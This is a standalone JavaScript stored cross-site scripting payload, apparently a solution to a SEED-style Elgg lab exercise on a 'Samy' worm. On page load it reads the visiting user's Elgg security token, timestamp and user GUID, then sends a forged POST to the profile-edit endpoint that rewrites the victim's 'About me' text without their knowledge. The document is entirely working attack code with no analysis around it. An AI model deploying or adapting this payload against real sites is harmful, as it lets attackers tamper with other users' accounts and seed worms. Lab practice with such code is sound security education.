<script type="text/javascript">
    window.onload = function () {
    // Retrieve victim's session tokens and ID
    var elggToken = elgg.security.token.__elgg_token;
    var elggTs = elgg.security.token.__elgg_ts;
    var victimGuid = elgg.session.user.guid;

    // Retrieve Samy's GUID to avoid re-infecting Samy's profile
    var samyGuid = elgg.page_owner.guid;

    // Construct the POST request URL
    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";

    // New "About me" content
    var content = "guid=" + victimGuid
    + "&__elgg_token=" + elggToken
    + "&__elgg_ts=" + elggTs
    + "&description=Samy is my HERO (added by Thunga Geethika)";

    // Ensure the victim's profile is modified, not Samy's
    if (victimGuid !== samyGuid) {
        // Create and send the AJAX POST request
        var Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
    }
}
</script>
